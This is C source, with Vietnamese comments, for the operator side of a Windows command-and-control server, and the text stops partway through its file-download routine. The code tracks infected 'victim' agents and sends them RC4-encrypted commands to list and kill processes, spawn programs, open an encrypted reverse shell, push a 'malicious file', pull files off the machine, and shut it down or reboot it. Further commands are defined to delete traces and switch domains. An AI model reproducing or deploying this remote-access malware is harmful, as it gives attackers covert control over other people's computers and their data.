#include<stdio.h>
#include<winsock2.h>
#include<winsock.h>
#include<Windows.h>
#include<Lmcons.h>
#include<time.h>
#include<TlHelp32.h>
#include<string.h>
#include<pathcch.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Pathcch.lib")

/*
* menu
* domainName: www.duongb3.com
* RC4Encyrpt (random key first chunk - 1024 byte).
* cau truc command.
* downloadFile, upload File
* SystemInformation.
* pipeLine (dll and cmd)
* 
*/


#define BREAK_WITH_SOCKET_ERROR(e) {printf(RED); printf("[-] %s. Error code = %d", \
e, WSAGetLastError()); printf(RESET); ExitProcess(0); }
#define SUCCESS(e) {printf(GREEN); \
printf("%s", e); printf(RESET); }
#define UNICODESUCCESS(e) {printf(GREEN); \
wprintf(L"%ls", e); printf(RESET);}
#define ERROR(e) {printf(RED); \
printf("%s", e); printf(RESET);}
#define UNICODEERROR(e) {printf(RED); \
wprintf(L"%ls", e); printf(RESET);}
#define WARNING(e) {printf(YELLOW);\
printf("%s", e); printf(RESET);}
#define UNICODEWARNING(e) {printf(YELLOW);\
wprintf(L"%s", e); printf(RESET);}
#define TAGINFORMATION(e) {printf(BLUE); \
printf("%s", e); printf(RESET); }
#define OBFUSCATE_XOR(a, b, c) a = (b | c) & (~b | ~c); 

// length of buffer
#define MAX_CHUNK 1025
#define MAX_BOX 256
#define MAX_KEY 16

//color
#define RED "\033[1;31m"
#define GREEN "\033[1;32m"
#define YELLOW "\033[1;33m"
#define BLUE "\033[1;34m"
#define RESET "\033[0m"

// custom command
#define ENUMERATE_PROCESS_COMMAND 's'
#define ENCRYPTED_REVERSE_SHELL_COMMAND 'y'
#define TERMINATE_PROCESS_COMMAND 'a'
#define SPAWN_PROCESS_COMMAND 'o'
#define UPLOAD_FILE_COMMAND 'r'
#define CHANGE_DOMAIN_COMMAND 'e'
#define CHANGE_PORT_COMMAND 'n'
#define DELETE_TRACE_COMMAND 'm'
#define SHUTDOWN_REBOOT_COMMAND 't'
#define DOWNLOAD_FILE_COMMAND 'd'
#define QUERY_RC4_KEY_COMMAND 'x'
#define CHECK_ACTIVE_COMMAND 'q'

#define SOCKET_DISCONNECTED -1
#define HOST_MENU_STATUS 1
#define MAIN_MENU_STATUS 0

#define C2_MENU {SUCCESS("(c2)") \
    ERROR("::> ")}
#define HOST_MENU(e) {UNICODESUCCESS(e) \
    ERROR("::> ")}

char choice1[MAX_CHUNK];
char choice2[MAX_CHUNK];

typedef struct listsocket {
    SOCKET Socket;
    WCHAR* DeviceName;
    WCHAR* UserName;
    SOCKADDR_IN SocketAddr;
    DWORD CurrentBuild;
    DWORD RevisionVersion;
    BYTE* Key;
} LISTSOCKET, * PLISTSOCKET;



typedef struct pipesock {
    SOCKET ioSock;
    HANDLE hPipe;
} PIPESOCK, * PPIPESOCK;

SOCKET srvSock;
LISTSOCKET agents[50];
BYTE box[MAX_BOX];
BYTE rc4Key[MAX_KEY + 1];
CRITICAL_SECTION criticalSection;
CRITICAL_SECTION csListAgent;
FD_SET activeSocket;
DWORD checkMenu;
WCHAR curDevice[MAX_CHUNK];

// Init: Create Folders
VOID Init() {
    BOOL isResult;
    
    // Khởi tạo các đối tượng critical section cần dùng để đồng bộ các luồng của chương trình.
    InitializeCriticalSection(&criticalSection);
    InitializeCriticalSection(&csListAgent);

    // Tạo một thư mục dùng để lưu dữ liệu thu thập được từ các agent.
    isResult = CreateDirectoryW(L"./data/", NULL);
    if (isResult == ERROR_ALREADY_EXISTS)
        BREAK_WITH_SOCKET_ERROR("Fail create directory")
    
    // Cấp phát vùng nhớ trên heap cho các thuộc tính của mảng agents (vì khai báo con trỏ chứ không phải mảng).
    for (int i = 0; i < 50; i++) {
        agents[i].DeviceName = (WCHAR*)malloc(32 * sizeof(WCHAR));
        agents[i].UserName = (WCHAR*)malloc(32 * sizeof(WCHAR));
        agents[i].Key = (BYTE*)malloc(17 * sizeof(BYTE));
    }
}


DWORD CheckSocket(BYTE* ip) {
    for (int i = 0; i < 50; i++) {
        if (agents[i].Socket == 0)
            break;
        BYTE checkIP[MAX_CHUNK];
        CopyMemory(checkIP, inet_ntoa(agents[i].SocketAddr.sin_addr), MAX_CHUNK);
        if (checkIP[strlen(checkIP)] == '\n') {
            checkIP[strlen(checkIP)] = '\0';
        }
        if (!strcmp(checkIP, ip)) {
            return i;
        }
    }
    return -1;
}

VOID GetInput(CHAR* str, CHAR** output) {
    BYTE* token;
    CHAR temp[MAX_CHUNK];
    ZeroMemory(temp, MAX_CHUNK);
    CopyMemory(temp, str, MAX_CHUNK);
    int len = strlen(temp);
    temp[len - 1] = '\0';
    token = strtok(temp, " ");
    int i = 0;
    while (token != NULL) {
        CopyMemory(output[i], token, MAX_CHUNK);
        token = strtok(NULL, " ");
        i++;
    }
}

VOID GetInformationAgent(BYTE* ip) {
    for (int i = 0; i < 50; i++) {
        if (agents[i].Socket == 0)
            break;
        if (!strcmp(ip, inet_ntoa(agents[i].SocketAddr.sin_addr))) {
            printf(YELLOW);
            wprintf(L"[+] Computer name: %ls\n", agents[i].DeviceName);
            wprintf(L"[+] User name: %ls\n", agents[i].UserName);
            printf("[+] Ipv4 address: %s\n", inet_ntoa(agents[i].SocketAddr.sin_addr));
            printf("[+] RC4 key: %s\n", agents[i].Key);
            printf("[+] Build version: %u\n", agents[i].CurrentBuild);
            printf("[+] Revision version: %u\n\n", agents[i].RevisionVersion);
            printf(RESET);
        }
    }
}

// Xử lý một số thông tin khi có agent kết nối đến c2.
VOID AgentConnected(SOCKET sock, BYTE recvBuf[], BYTE key[]) {
    CHAR ipv4Addr[32];
    WCHAR userName[UNLEN + 1];
    DWORD dwBuildNum, dwRevVer;
    WCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
    BOOL isResult;

    // Với tham số truyền vào là thông tin cơ bản của một agent, bao gồm:
    // [+] 32 bytes đầu tiên là tên thiết bị của agent, kiểu wide char
    // [+] 544 bytes tiếp theo là username của agent, kiểu wide char.
    // [+] 32 bytes  tiếp theo là địa chỉ IPv4.
    // [+] 4 bytes  tiếp theo là build version.
    // [+] 4 bytes  tiếp theo là revision version.
    RtlCopyMemory(computerName, recvBuf, 32);
    RtlCopyMemory(userName, recvBuf + 32, (UNLEN + 1) * 2);
    RtlCopyMemory(ipv4Addr, recvBuf + 576, 32);
    RtlCopyMemory(&dwBuildNum, recvBuf + 608, 4);
    RtlCopyMemory(&dwRevVer, recvBuf + 612, 4);

    // Tạo thư mục theo device name của từng agent bên trong thư mục ./data/.
    WCHAR* temp = (WCHAR*)malloc(MAX_CHUNK * sizeof(WCHAR));
    RtlCopyMemory(temp, L"./data/", MAX_CHUNK * sizeof(WCHAR));
    wcscat(temp, computerName);
    isResult = CreateDirectoryW(temp, NULL);
    free(temp);

    // Duyệt qua từng phần tử có trong mảng agents để thêm thông tin cho agent mới.
    for (int i = 0; i < 50; i++) {

        // Nếu socket ở phần tử i là INVALID_SOCKET thì thêm thông tin agent vào phần tử này.
        if (agents[i].Socket == 0) {

            // Giành quyền sở hữu critical section để tránh xung đột với luồng kiểm tra kết nối và gỡ các agent.
            EnterCriticalSection(&csListAgent);

            // Thêm các thông tin như socket, device name, địa chỉ IP, key và các version.
            agents[i].Socket = sock;
            RtlCopyMemory(agents[i].DeviceName, computerName, 32);
            RtlCopyMemory(agents[i].UserName, userName, (UNLEN + 1) * 2);
            ZeroMemory(&agents[i].SocketAddr, sizeof(SOCKADDR_IN));
            agents[i].SocketAddr.sin_addr.s_addr = inet_addr(ipv4Addr);
            agents[i].SocketAddr.sin_family = AF_INET;
            agents[i].SocketAddr.sin_port = htons(5555);
            RtlCopyMemory(agents[i].Key, key, 17);
            agents[i].CurrentBuild = dwBuildNum;
            agents[i].RevisionVersion = dwRevVer;

            // Giải phóng critical section.
            LeaveCriticalSection(&csListAgent);

            break;
        }
    }
    
    // In ra thông tin cơ bản của agent vừa kết nối đến.
    printf(YELLOW);
    wprintf(L"[+] Computer name: %ls\n", computerName);
    wprintf(L"[+] User name: %ls\n", userName);
    printf("[+] Ipv4 address: %s\n", ipv4Addr);
    printf("[+] Build version: %u\n", dwBuildNum);
    printf("[+] Revision version: %u\n\n", dwRevVer);
    printf(RESET);

    // Xử lý một chút để in ra host menu hay main menu.
    if(checkMenu == HOST_MENU_STATUS)
        HOST_MENU(curDevice)
    else if (checkMenu == MAIN_MENU_STATUS)
        C2_MENU
}


// swap two bytes
VOID Swap(BYTE* a, BYTE* b) {
    BYTE temp = *a;
    *a = *b;
    *b = temp;
}

// initialize the state of box
VOID RC4Init( BYTE key[]) {
    DWORD i, j = 0;
    for (i = 0; i < 256; i++) {
        box[i] = i;
    }
    for (i = 0; i < 256; i++) {
        j = (j + box[i] + key[i % MAX_KEY]) % 256;
        Swap(&box[i], &box[j]);
    }
}

// rivest cipher 4
VOID RC4Crypt(BYTE* buf, DWORD dwBufLen) {
    DWORD i = 0, j = 0;
    for (DWORD n = 0; n != dwBufLen; n++) {
        i = (i + 1) % 256;
        j = (j + box[i]) % 256;
        Swap(&box[i], &box[j]);
        BYTE k = box[(box[i] + box[j]) % 256];
        OBFUSCATE_XOR(buf[n], buf[n], k);
    }
}

// rivest cipher 4 for a segment
VOID RC4CryptSegment(BYTE* buf, DWORD dwCurBytesRecv, DWORD* i, DWORD* j) {
    for (DWORD n = 0; n != dwCurBytesRecv; n++) {
        *i = (*i + 1) % 256;
        *j = (*j + box[*i]) % 256;
        Swap(&box[*i], &box[*j]);
        BYTE k = box[(box[*i] + box[*j]) % 256];
        OBFUSCATE_XOR(buf[n], buf[n], k);
    }
}

// Liệt kê các tiến trình đang chạy bên phía victim: psenum
BOOL ProcessEnumeration(SOCKET ioSock) {
    DWORD i = 0, j = 0;
    BYTE command[MAX_CHUNK];
    WCHAR recvBuf[MAX_CHUNK];
    DWORD dwCurBytesRecv = 0, dwBytesRecv = 0, dwAllBytesRecv = 0;
    
    // Gán byte đầu tiên bằng với lệnh liệt kê tiến trình đang chạy.
    command[0] = ENUMERATE_PROCESS_COMMAND;

    // Mã hóa chunk chứa command cần gửi đi.
    RC4Init(rc4Key);
    RC4Crypt(command + 1, MAX_CHUNK - 2);

    // Gửi command đến cho phía victim.
    if (send(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
        ERROR("[-] Failed to send command to victim\n")
        return FALSE;
    }

    // Nhận phản hồi từ phía victim là tổng số bytes mà phía victim sẽ gửi.
    if (recv(ioSock, (CHAR*)&dwAllBytesRecv, sizeof(dwAllBytesRecv), 0) < 0) {
        ERROR("[-] Failed to receive buffer size\n")
        return FALSE;
    }

    // Nếu số bytes nhận được bằng 0 thì trả về FALSE và in ra thất bại.
    if (!dwAllBytesRecv) {
        ERROR("[-] Failed to get process list from victim\n")
        return FALSE;
    }

    // Kể từ dưới đây là xử lý dữ liệu phản hồi nếu số bytes nhận về lớn hơn 0.
    TAGINFORMATION("***************************************PROCESS LIST*****************************************\n")

    
    // Tạo một chuỗi từ key để XOR với dữ liệu phản hồi để thực hiện giải mã.
    RC4Init(rc4Key);

    // Giành quyền sở hữu critical section để tránh xung đột với luồng kiểm tra kết nối các agent.
    EnterCriticalSection(&criticalSection);

    // Dùng một vòng while để nhận lần lượt dữ liệu từ phía victim theo từng gói là 1 CHUNK (1024 bytes).
    while (1) {

        // Nhận lần lượt các CHUNK.
        dwCurBytesRecv = recv(ioSock, (CHAR*)recvBuf, MAX_CHUNK - 1, 0);

        // Nếu số bytes nhỏ hơn 0 thì thực hiện thoát vòng lặp.
        if (dwCurBytesRecv < 0) {
            ERROR("[-] Failed to receive bytes\n")
            break;
        }

        // Giải mã dữ liệu nhận được từ phía victim theo từng CHUNK.
        RC4CryptSegment(recvBuf,dwCurBytesRecv, &i, &j);
        recvBuf[dwCurBytesRecv / 2] = L'\0';
        wprintf(L"%ls", recvBuf);
        dwBytesRecv += dwCurBytesRecv;

        // Cuối cùng nếu số bytes nhận được lớn hơn hoặc bằng tổng số bytes victim gửi thì thoát vòng lặp.
        if (dwBytesRecv >= dwAllBytesRecv) {
            break;
        }
    }

    // Giải phóng critical section.
    LeaveCriticalSection(&criticalSection);

    // In ra kết quả thành công và trả về TRUE.
    SUCCESS("[+] Enumerate processes success\n")
    return TRUE;
}

DWORD CheckLastSegment(DWORD dwAllBytesRecv, DWORD dwBytesReceive) {
    DWORD dwRemainBytesRecv = dwAllBytesRecv - dwBytesReceive;
    if (dwRemainBytesRecv < MAX_CHUNK - 1)return dwRemainBytesRecv;
    return MAX_CHUNK - 1;
}

// Gửi lệnh cmd đến cho phía victim
DWORD WINAPI WriteDataToVictim(LPVOID lpParam) {
    BOOL bExit = FALSE;
    DWORD dwSendBufLen = 0;
    CHAR sendBuf[MAX_CHUNK];
    SOCKET ioSock = *(SOCKET*)lpParam;

    // Yêu cầu quyền chiếm giữ đối tượng critical section để tránh xung đột với luồng
    // kiểm tra trạng thái các agents.
    EnterCriticalSection(&criticalSection);

    // Sử dụng vòng lặp để tạo các lệnh cmd một cách tuần tự.
    while (1) {
        
        // Nhận vào lệnh cần gửi đi, nếu nó là "exit" thì gán bExit bằng TRUE.
        fgets(sendBuf, MAX_CHUNK - 1, stdin);
        if (RtlCompareMemory(sendBuf, "exit", 4) == 4)
            bExit = TRUE;

        // Mã hóa lệnh cmd cần gửi đi.
        dwSendBufLen = strlen(sendBuf);
        RC4Init(rc4Key); 
        RC4Crypt(sendBuf, dwSendBufLen); 

        // Gửi lệnh cmd đến cho victim.
        if (send(ioSock, sendBuf, dwSendBufLen, 0) < 0) {
            ERROR("[-] Failed to send command to victim\n")
            bExit = TRUE;
        }

        // Nếu bExit bằng TRUE thì giải phóng critical section và thoát luồng.
        if (bExit) {
            LeaveCriticalSection(&criticalSection);
            ExitThread(0);
        }
    }
    ExitThread(0);
    return 1;
}

// Đọc dữ liệu phản hồi từ tiến trình cmd của victim.
DWORD WINAPI ReadDataFromVictim(LPVOID lpParam) {
    DWORD i = 0, j = 0;
    CHAR recvBuf[MAX_CHUNK];
    SOCKET ioSock = *(SOCKET*)lpParam;
    DWORD dwBytesRecv = 0, dwAllBytesRecv = 0, dwCurBytesRecv = 0;
    
    // Sử dụng một vòng lặp để nhận lần lượt dữ diệu từ từng lệnh cmd được gửi đi bởi c2.
    while (1) {
        
        // Đầu tiên nhận tổng kích thước của dữ liệu mà victim cần gửi, dữ liệu này được gửi thô mà không cần mã hóa.
        if (recv(ioSock, (CHAR*)&dwAllBytesRecv, sizeof(dwAllBytesRecv), 0) < 0) {
            ERROR("\n[-] Failed to receive buffer size\n")
            ExitThread(0);
            return 0;
        }

        // Khởi tạo chuỗi từ key để thực hiện giải mã dữ liệu 
        i = j = 0;
        RC4Init(rc4Key);
        
        // Sử dụng tiếp một vòng lặp để đọc hết kích thước của dữ liệu cần nhận.
        while (1) {

            // Nhận dữ liệu tuần tự theo từng CHUNK (1024 bytes).
            dwCurBytesRecv = recv(ioSock, recvBuf, CheckLastSegment(dwAllBytesRecv, dwBytesRecv), 0);
            if (dwCurBytesRecv < 0){
                ERROR("[-] Failed to receive bytes\n")
                ExitThread(0);
                return 0;
            }

            // Giải mã từng CHUNK nhận được.
            RC4CryptSegment(recvBuf, dwCurBytesRecv, &i, &j);
            dwBytesRecv += dwCurBytesRecv;
            recvBuf[dwCurBytesRecv] = '\0';
            
            // In ra màn hình dữ liệu nhận được từ victim.
            printf("%s", recvBuf);
            if (dwBytesRecv >= dwAllBytesRecv) {
                break;
            }
        }

        // Gán lại số bytes đã nhận bằng 0 để tái sử dụng cho lệnh cmd tiếp theo.
        dwBytesRecv = 0;
    }

    // Thoát luồng và trả về.
    ExitThread(1);
    return 1;
}

// Tạo một encrypted reverse shell
BOOL EncryptedReverShell(SOCKET ioSock) {
    HANDLE hHandleList[2];
    DWORD dwEventIndex = 0;
    BYTE command[MAX_CHUNK];
    HANDLE hReadThread, hWriteThread;
    DWORD dwReadThreadId, dwWriteThreadId;
    
    // Gán byte đầu tiên là lệnh yêu cầu tạo reverse shell.
    command[0] = ENCRYPTED_REVERSE_SHELL_COMMAND;

    // Mã hóa dữ liệu để chuẩn bị gửi đến cho victim.
    RC4Init(rc4Key);
    RC4Crypt(command + 1, MAX_CHUNK - 2);

    // Gửi command đến cho phía victim.
    if (send(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
        ERROR("[-] failed to send command to victim\n")
        return FALSE;
    }
    // Tạo 2 luồng cho việc đọc và ghi dữ liệu từ cmd.exe của victim.
    // 2 luồng này thực thi các hàm ReadDataFromVictim và WriteDataToVictim.
    hReadThread = CreateThread(NULL, 0, ReadDataFromVictim, &ioSock, 0, &dwReadThreadId);
    hWriteThread = CreateThread(NULL, 0, WriteDataToVictim, &ioSock, 0, &dwWriteThreadId);

    // Thực hiện chờ một trong 2 luồng trên thực hiện xong hàm.
    hHandleList[0] = hReadThread;
    hHandleList[1] = hWriteThread;
    dwEventIndex = WaitForMultipleObjects(2, hHandleList, FALSE, INFINITE);

    // Thực hiện ngắt cả 2 thread khi có một thread đã kết thúc và đóng các handle.
    TerminateThread(hWriteThread, 0);
    TerminateThread(hReadThread, 0);
    CloseHandle(hReadThread);
    CloseHandle(hWriteThread);

    // In ra kết quả thành công và trả về TRUE;
    SUCCESS("[+] Exit encrypted reverse shell\n")
    return TRUE;
}

// Ngắt một tiến trình đang chạy bên phía victim: pster
BOOL ProcessTermination(SOCKET ioSock, DWORD psId) {
    DWORD dwProcessID = psId;
    BYTE command[MAX_CHUNK], recvBuf[MAX_CHUNK];
    DWORD dwBytesRecv = 0, dwAllBytesRecv = 0;

    // Gán byte đầu tiên bằng lệnh ngắt tiến trình 
    // và các bytes còn lại (1023 bytes) bằng ID của tiến trình cần ngắt.
    command[0] = TERMINATE_PROCESS_COMMAND;
    *((DWORD*)(command + 1)) = dwProcessID;

    // Mã hóa command (1024 bytes).
    RC4Init(rc4Key);
    RC4Crypt(command + 1, MAX_CHUNK - 2);
    
    // Gửi command đến cho phía victim.
    if (send(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
        ERROR("[-] Failed to send command to victim\n")
        return FALSE;
    }

    // Nhận dữ liệu phản hồi từ victim.
    if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0) {
        ERROR("[-] Failed to receive the exit code of process\n")
        return FALSE;
    }

    // Giải mã dữ liệu và in ra kết quả thành công: 1 là thành công, các số còn lại là lỗi.
    RC4Init(rc4Key);
    RC4Crypt(recvBuf, MAX_CHUNK - 1);
    printf(GREEN); printf("[+] Termination state of process = %hhu\n", recvBuf[0]); printf(RESET);
    return TRUE;
}

// Xử lý lệnh tạo process: psspaw
BOOL ProcessSpawn(SOCKET ioSock, WCHAR* psName) {
    DWORD dwPathSize; 
    BYTE spawnStatus;
    BYTE command[MAX_CHUNK], recvBuf[MAX_CHUNK];
    WCHAR processPath[MAX_CHUNK];
    
    // Kiểm tra tên của process, nếu không có tên thì trả về FALSE.
    if (!lstrcmpW(psName, L"\0")) {
        ERROR("[-] Please type process name.\n")
        return FALSE;
    }
    // Ngược lại sao chép đường dẫn truyền vào vào biến processPath.
    else
        CopyMemory(processPath, psName, MAX_CHUNK);

    // Gắn byte đầu tiên bằng lệnh tạo process 
    // và các bytes tiếp theo là đường dẫn của process cần tạo.
    command[0] = SPAWN_PROCESS_COMMAND;
    dwPathSize = (wcslen(processPath) + 1) * 2;
    RtlCopyMemory(command + 1, processPath, dwPathSize);
    
    // Mã hóa dữ liệu cần truyền đi và gửi command đến cho victim.
    RC4Init(rc4Key);
    RC4Crypt(command + 1, MAX_CHUNK - 2);
    if (send(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
        ERROR("[-] Failed to send command to victim\n")
        return FALSE;
    }

    // Nhận dữ liệu từ phía victim.
    if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0) {
        ERROR("[-] Failed to receive the exit code of process\n")
        return FALSE;
    }

    // Giải mã dữ liệu nhận được và in ra danh sách cách process.
    RC4Init(rc4Key);
    RC4Crypt(recvBuf, MAX_CHUNK - 1);
    printf(GREEN); printf("[+] Spawn state of process = %hhu\n", recvBuf[0]); printf(RESET);
    return TRUE;
}

// Gửi lệnh shutdown hoặc reboot cho victim.
BOOL ShutDownOrRebootVictim(SOCKET ioSock, DWORD mode){
    BYTE command[MAX_CHUNK], recvBuf[MAX_CHUNK];

    // Gán byte đầu tiên là command (shutdown hoặc reboot).
    command[0] = SHUTDOWN_REBOOT_COMMAND;

    // Gán byte thứ 2 là mode cho command này:
    // 0 cho reboot và 1 cho shutdown.
    command[1] = mode;

    // 4 bytes tiếp theo là thời gian chờ victim thực hiện lệnh kể từ lúc nhận được yêu cầu.
    *(DWORD*)(command + 2) = 15;
    
    // Mã hóa command để gửi đến cho victim.
    RC4Init(rc4Key);
    RC4Crypt(command + 1, MAX_CHUNK - 2);

    // Gửi dữ liệu đến cho phía victim.
    if (send(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
        ERROR("[-] Failed to send command to victim\n")
        return FALSE;
    }

    // Nhận phản hồi từ phía victim.
    if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0){
        ERROR("[-] Failed to receive the shutdown or reboot state from victim\n")
        return FALSE;
    }

    // Giải mã dữ liệu phản hồi và in kết quả, 1 cho thành công và các số còn lại là mã lỗi.
    RC4Init(rc4Key);
    RC4Crypt(recvBuf, MAX_CHUNK - 1);
    printf(GREEN);
    printf("[+] The shutdown or reboot state from victim = %hhu\n", recvBuf[0]);
    printf(RESET);
    return TRUE;
}


BOOL CheckDirectory(WCHAR* downloadFilePath) {
    HRESULT isResult;
    WCHAR temp[MAX_CHUNK];
    CopyMemory(temp, downloadFilePath, MAX_CHUNK);
    isResult = PathCchRemoveFileSpec(&temp, MAX_CHUNK);
    DWORD checkPath = GetFileAttributesW(temp);
    return (checkPath != INVALID_FILE_ATTRIBUTES && (checkPath & FILE_ATTRIBUTE_DIRECTORY));
}

// Tải một file đến phía victim: upload
BOOL UploadFile(SOCKET ioSock, WCHAR* inputPath, WCHAR* outputPath) {
    HANDLE hFile;
    DWORD C2FileSize;
    DWORD i = 0, j = 0;
    DWORD dwNumOfBytesRead = 0, dwNumOfBytesWritten = 0;
    BYTE recvBuf[MAX_CHUNK], sendBuf[MAX_CHUNK], command[MAX_CHUNK];
    WCHAR victimPathFile[MAX_CHUNK];
    DWORD dwVictimPathFileSize = (wcslen(victimPathFile) + 1) * 2;
    WCHAR C2PathFile[MAX_CHUNK];

    // Kiểm tra tham số đầu vào, nếu outputPath bằng NULL 
    // thì thay thay thế nó bằng đường dẫn hiện hành là "./upload".
    if (!lstrcmpW(outputPath, L"\0"))
        CopyMemory(victimPathFile, L".\\upload", MAX_CHUNK);
    else
        CopyMemory(victimPathFile, outputPath, MAX_CHUNK);

    // Kiểm tra đường dẫn của file cần upload, nếu bằng NULL thì trả về FALSE.
    if (!lstrcmpW(inputPath, L"\0")) {
        ERROR("[-] Please type input path file.\n")
        return FALSE;
    }
    else
        CopyMemory(C2PathFile, inputPath, MAX_CHUNK);

    // Mở file cần upload nếu file tồn tại ở quyền đọc.
    hFile = CreateFileW(C2PathFile, GENERIC_READ, 
        NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // Nếu mở file thất bại thì in kết quả và trả về FALSE.
    if(hFile == INVALID_HANDLE_VALUE){
        printf(RED);
        printf("[-] Failed to open file. Error code = %d\n", GetLastError());
        printf(RESET);
        return FALSE;
    }

    // Lấy kích thước của file cần upload.
    C2FileSize = GetFileSize(hFile, NULL);

    // Gán byte đầu tiên bằng lệnh upload.
    command[0] = UPLOAD_FILE_COMMAND;

    // Gán 4 bytes tiếp theo bằng kích thước của file cần upload.
    *(DWORD*)(command + 1) = C2FileSize;

    // Các bytes còn lại của CHUNK là đường dẫn dùng để lưu bên phía victim.
    RtlCopyMemory(command + 5, victimPathFile, MAX_CHUNK - 10);

    // Mã hóa dữ liệu gửi đi.
    RC4Init(rc4Key);
    RC4Crypt(command + 1, MAX_CHUNK - 2);

    // Gửi command đến cho victim.
    if (send(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
        ERROR("[-] Failed to send command to victim\n")
        return SOCKET_DISCONNECTED;
    }
    // Nhận phản hồi từ victim.
    if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0) {
        ERROR("[-] Failed to receive status from victim.\n")
        return SOCKET_DISCONNECTED;
    }

    // Thực hiện giải mã phản hồi.
    RC4Init(rc4Key);
    RC4Crypt(recvBuf, MAX_CHUNK - 1);

    // Nếu byte đầu tiên bằng NULL tức là bên phía victim không thể tạo file mới.
    // Lúc này in ra kết quả upload thất bại và trả về FALSE.
    if (!recvBuf[0]) {
        ERROR("[-] Failed to create the malicious file in client.\n")
        return FALSE;
    }

    // Thành công tạo một file mới bên phía victim.
    SUCCESS("[+] Create a malicious file in client success\n")

    // Khởi tạo một chuỗi từ key dùng để XOR với dữ liệu cần gửi đi.
    RC4Init(rc4Key);

    // Giành quyền sở hữu critical section để tránh xung đột với luồng kiểm tra kết nối các agent.
    EnterCriticalSection(&criticalSection);

    // Sử dụng một vòng lặp để gửi lần lượt dữ liệu có trong file theo từng CHUNK (1024 bytes).
    while (ReadFile(hFile, sendBuf, MAX_CHUNK - 1, &dwNumOfBytesRead, NULL)) {

        // Nếu số byte đọc được từ file bằng 0 thì thoát vòng lặp.
        if (!dwNumOfBytesRead)break;

        // Mã hóa từng CHUNK để gửi dữ liệu đi.
        RC4CryptSegment(sendBuf, dwNumOfBytesRead, &i, &j);

        // Gửi dữ liệu đến victim theo từng CHUNK.
        if (send(ioSock, sendBuf, dwNumOfBytesRead, 0) < 0) {
            ERROR("[-] Failed to send a chunk of data.\n")
            return FALSE;
        }
    }

    // Giải phóng critical section.
    LeaveCriticalSection(&criticalSection);

    // Cuối cùng in ra kết quả thành công upload và trả về TRUE;
    SUCCESS("[+] Upload file to victim success\n")
    return TRUE; 
}


// Tải về một file tồn tại trên máy victim: download
BOOL DownloadFile(SOCKET ioSock, WCHAR* inputPath, WCHAR* outputPath) {
    DWORD i = 0, j = 0;
    HANDLE hFile = NULL;
    DWORD dwPathFileSize = 0;
    DWORD dwNumOfBytesWritten = 0;
    BYTE command[MAX_CHUNK], recvBuf[MAX_CHUNK];
    DWORD dwAllBytesRecv = 0, dwCurBytesRecv = 0, dwBytesRecv = 0;
    WCHAR pathFile[MAX_CHUNK];
    WCHAR downloadFilePath[MAX_CHUNK];
    
    // Kiểm tra tham số đầu vào, 
    // nếu outputPath bằng NULL thì thay thế nó bằng đường dẫn hiện hành và tên file là download.
    if (!lstrcmpW(outputPath, L"\0")) {
        CopyMemory(downloadFilePath, L".\\download", MAX_CHUNK);
    }
    else
        CopyMemory(downloadFilePath, outputPath, MAX_CHUNK);

    // Kiểm tra đường dẫn file bên phía victim, nếu nó bằng NULL thì in lỗi và trả về FALSE.
    if (!lstrcmpW(inputPath, L"\0")) {
        ERROR("[-] Please type input path file.\n")
        return FALSE;
    }
    else
        CopyMemory(pathFile, inputPath, MAX_CHUNK);

    // Kiểm tra đường dẫn dùng để lưu bên phía C2 có tồn tại hay không, nếu không trả về FALSE.
    BOOL isRsult = CheckDirectory(downloadFilePath);
    if (isRsult == FALSE) {
        ERROR("[-] Path not exist.\n")
            return FALSE;
    }

    // Gán byte đầu tiên bằng lệnh download.
    command[0] = DOWNLOAD_FILE_COMMAND;
    
    // Các bytes còn lại là kích thước của đường dẫn file cần download.
    dwPathFileSize = (wcslen(pathFile) + 1) * 2;
    RtlCopyMemory(command + 1, pathFile, dwPathFileSize);

    // Mã hóa command theo 1 CHUNK.
    RC4Init(rc4Key);
    RC4Crypt(command + 1, MAX_CHUNK - 2);

    // Gửi dữ liệu đến bên phía victim.
    if (send(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
        ERROR("[-] Failed to send command to victim.\n")
        return FALSE;
    } 
    // Nhận phản hồi từ phía victim. 
    if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0) {
        ERROR("[-] Failed to receive download status from victim.\n")
        return FALSE;
    }

    // Giải mã dữ liệu phản hồi.
    RC4Init(rc4Key);
    RC4Crypt(recvBuf, MAX_CHUNK - 1);

    // Nếu bytes đầu tiên bằng NULL thì trả về FALSE.
    if (!recvBuf[0]) {
        ERROR("[-] Failed to download file from victim\n")
        return FALSE;
    }

    // Ngược lại thì các bytes tiếp theo sẽ bằng kích thước của file cần download.
    dwAllBytesRecv = *(DWORD*)(recvBuf + 1);

    // Tạo một file mới hoặc mở nếu nó tồn tại dưới quyền ghi để ghi dữ liệu của file cần download.
    hFile = CreateFileW(downloadFilePath, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hFile) {
        ERROR("[-] Failed to create file.\n")
        return FALSE;
    }

    // Khởi tạo một chuỗi từ KEY dùng để XOR với dữ liệu nhận được từ victim.
    RC4Init(rc4Key);

    // Giành quyền sở hữu critical section để tránh xung đột với luồng kiểm tra kết nối các agent.
    EnterCriticalSection(&criticalSection);

    // Sử dụng một vòng lặp để nhận tất cả dữ liệu của file cần download.
    while (1) {
        
        // Nhận dữ liệu từ victim theo từng CHUNK.
        dwCurBytesRecv = recv(ioSock, recvBuf, MAX_CHUNK - 1, 0);

        // Nếu số bytes nhận được bé hơn 0 thì in lỗi và trả về FALSE.
        if(dwCurBytesRecv < 0){
            ERROR("[-] Failed to receive data from victim.\n")
            return FALSE;
        }

        // Giải mã dữ liệu nhận được theo từng CHUNK.
        RC4CryptSegment(recvBuf, dwCurBytesRecv, &i, &j);

        // Ghi các CHUNK (1024 bytes) vào trong file được tạo mới ở phía trên.
